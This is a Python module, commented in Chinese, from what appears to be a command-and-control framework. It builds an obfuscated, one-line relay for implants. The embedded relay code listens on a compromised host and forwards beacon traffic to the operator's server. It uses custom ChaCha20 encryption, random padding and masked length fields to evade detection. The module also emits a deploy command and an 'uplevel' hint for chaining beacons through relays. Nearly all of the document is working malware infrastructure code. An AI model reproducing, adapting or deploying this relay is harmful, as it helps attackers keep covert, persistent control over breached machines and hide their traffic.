"""
@module: proxy
@desc: 生成 Proxy 单行部署代码
@params: host port [protocol] [server_key_hex] [out_dir]
"""
import json
import os
import secrets

from server.core.bootstrap import deploy_command
from server.s_modules import tls_util

MODULE = {
    "desc": "生成 Proxy 单行部署代码",
    "params": [
        ("host", "必填，server 地址"),
        ("port", "必填，server implant 端口"),
        ("protocol", "默认 tls（当前仅 tls）"),
        ("server_key_hex", "可选；缺省从 server/config.json 读取 implant_key"),
        ("out_dir", "默认 s_modules/output"),
        ("proxy_id", "可选；中继标识，转发 register 时 via=proxy:<id>（区分多级代理）"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

_PROXY_CODE = '''\
import socket as a,struct as b,zlib as c,base64 as d,json as e,threading as f,secrets as l,hashlib as h,hmac as hm
_SK=bytes({server_key})
_PK=bytes({proxy_key})
_SH={server_host!r}
_SP={server_port}
_LP={listen_port}
_CERT={cert!r}
_KEY={key!r}
def Q(s,x,y,z,w):
 s[x]=(s[x]+s[y])&0xffffffff
 s[w]=((s[w]^s[x])<<16|(s[w]^s[x])>>16)&0xffffffff
 s[z]=(s[z]+s[w])&0xffffffff
 s[y]=((s[y]^s[z])<<12|(s[y]^s[z])>>20)&0xffffffff
 s[x]=(s[x]+s[y])&0xffffffff
 s[w]=((s[w]^s[x])<<8|(s[w]^s[x])>>24)&0xffffffff
 s[z]=(s[z]+s[w])&0xffffffff
 s[y]=((s[y]^s[z])<<7|(s[y]^s[z])>>25)&0xffffffff
def B(k,n,ct):
 s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]+list(b.unpack("<8I",k))+[ct]+list(b.unpack("<3I",n))
 w=s[:]
 for _ in range(10):
  Q(w,0,4,8,12);Q(w,1,5,9,13);Q(w,2,6,10,14);Q(w,3,7,11,15)
  Q(w,0,5,10,15);Q(w,1,6,11,12);Q(w,2,7,8,13);Q(w,3,4,9,14)
 return b.pack("<16I",*[(w[i]+s[i])&0xffffffff for i in range(16)])
def X(dat,k,n):
 buf=bytearray();t=0
 for i in range(0,len(dat),64):
  buf+=bytes(u^v for u,v in zip(dat[i:i+64],B(k,n,t)));t+=1
 return bytes(buf)
def E(q,k):
 ek,mk=h.sha256(b"e"+k).digest(),h.sha256(b"m"+k).digest()
 n=l.token_bytes(12);ct=X(c.compress(q),ek,n)
 pl=n+ct+hm.new(mk,n+ct,h.sha256).digest()
 pd=l.token_bytes(l.randbelow(256))
 return pl+pd+bytes([len(pd)])
def D(q,k):
 pd=q[-1];z=q[:-1-pd]
 ek,mk=h.sha256(b"e"+k).digest(),h.sha256(b"m"+k).digest()
 n,ct,tg=z[:12],z[12:-32],z[-32:]
 if not hm.compare_digest(tg,hm.new(mk,n+ct,h.sha256).digest()):raise ValueError("MAC")
 return c.decompress(X(ct,ek,n))
def S(s,d,k):q=E(d,k);s.sendall(b.pack(">I",len(q)^int.from_bytes(h.sha256(k+b"len").digest()[:4],"big"))+q)
def R(s,k):
 r=b""
 while 4-len(r):
  t=s.recv(4-len(r))
  if not t:raise ConnectionError()
  r+=t
 u=b.unpack(">I",r)[0]^int.from_bytes(h.sha256(k+b"len").digest()[:4],"big")
 if u==0:return b""
 v=b""
 while u-len(v):
  w=s.recv(u-len(v))
  if not w:raise ConnectionError()
  v+=w
 return D(v,k)
def TL(c):
 import tempfile as _t,os as _o,ssl as _g
 cf=_t.NamedTemporaryFile(delete=False,suffix=".pem");cf.write(_CERT.encode());cf.close()
 kf=_t.NamedTemporaryFile(delete=False,suffix=".pem");kf.write(_KEY.encode());kf.close()
 try:
  ctx=_g.SSLContext(_g.PROTOCOL_TLS_SERVER)
  ctx.load_cert_chain(cf.name,kf.name)
  return ctx.wrap_socket(c,server_side=True)
 finally:
  _o.unlink(cf.name);_o.unlink(kf.name)
def a2s(c,u):
 try:
  _p=b""
  while len(_p)<256:_p+=c.recv(256-len(_p))
  while 1:
   d=R(c,_PK);m=e.loads(d.decode())
   if m.get("type")=="register":m["via"]={via!r}
   S(u,e.dumps(m).encode(),_SK)
 except:pass
def s2a(c,u):
 try:
  while 1:
   d=R(u,_SK);S(c,d,_PK)
 except:pass
def fwd(c):
 u=None
 try:
  u=a.socket();u.settimeout(30);u.connect((_SH,_SP))
  u.sendall(l.token_bytes(256))
  f.Thread(target=a2s,args=(c,u),daemon=True).start()
  s2a(c,u)
 except:pass
 finally:
  try:c.close()
  except:pass
  try:u.close()
  except:pass
def run():
 s=a.socket();s.setsockopt(a.SOL_SOCKET,a.SO_REUSEADDR,1)
 try:s.bind(("0.0.0.0",_LP))
 except Exception as e:print("proxy bind failed:",e);return
 s.listen(64)
 while 1:
  try:
   c,_=s.accept()
   try:c=TL(c)
   except:continue
   f.Thread(target=fwd,args=(c,),daemon=True).start()
  except:pass
run()
'''


def _read_server_key() -> bytes:
    """从 server/config.json 读取 implant_key（proxy↔server 用，6.5）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def run(host, port, protocol="tls", server_key_hex=None, out_dir=None,
        proxy_id=None):
    """生成 Proxy 代码与部署命令。

    Args:
        host: server 地址（proxy 回连）
        port: server implant 端口
        protocol: 当前仅 "tls"
        server_key_hex: proxy↔server 加密密钥（缺省读 config.json）
        out_dir: 证书与产物目录

    Returns:
        dict: proxy_key / fingerprint / deploy / files / uplevel 提示
    """
    port = int(port)
    protocol = (protocol or "tls").lower()
    if protocol != "tls":
        return {"status": "error",
                "message": f"unsupported protocol: {protocol} (当前仅 tls)"}

    server_key = None
    if server_key_hex:
        server_key = bytes.fromhex(server_key_hex)
    else:
        server_key = _read_server_key()
        if server_key is None:
            return {"status": "error",
                    "message": "config.json 无有效 implant_key。"
                               "请先 s_exec keygen。"}

    proxy_key = secrets.token_bytes(32)
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    try:
        cert = tls_util.generate_self_signed(host, out_dir)
    except RuntimeError as e:
        return {"status": "error", "message": str(e)}

    listen_port = _pick_listen_port()
    code = _PROXY_CODE.format(
        server_key=str(list(server_key)).replace(" ", ""),
        proxy_key=str(list(proxy_key)).replace(" ", ""),
        server_host=host, server_port=port, listen_port=listen_port,
        cert=cert["cert_pem"], key=cert["key_pem"],
        via=(f"proxy:{proxy_id}" if proxy_id else "proxy"),
    )
    compile(code, "<proxy>", "exec")  # 生成即校验

    command = deploy_command(code)  # 部署壳用随机单字节 k，与通信密钥无关
    files = {
        "cert": cert["cert_file"],
        "key": cert["key_file"],
        "xor_key": os.path.join(out_dir, "proxy_key.hex"),
        "command": os.path.join(out_dir, "proxy_command.txt"),
    }
    with open(files["xor_key"], "w", encoding="utf-8") as f:
        f.write(proxy_key.hex() + "\n")
    with open(files["command"], "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "proxy_key": proxy_key.hex(),
        "fingerprint": cert["fingerprint"],
        "listen_port": listen_port,
        "deploy": command,
        "files": files,
        "uplevel_hint": (
            f"uplevel <beacon_id> tls {host} {listen_port} "
            f"{proxy_key.hex()} {cert['fingerprint']}"
        ),
    }


def _pick_listen_port() -> int:
    """临时端口探测（listen 端口与 server 端口错开）。"""
    s = __import__("socket").socket()
    s.bind(("0.0.0.0", 0))
    port = s.getsockname()[1]
    s.close()
    return port


if __name__ == "__main__":
    print("usage: s_exec proxy <host> <port> [protocol] [server_key_hex]")
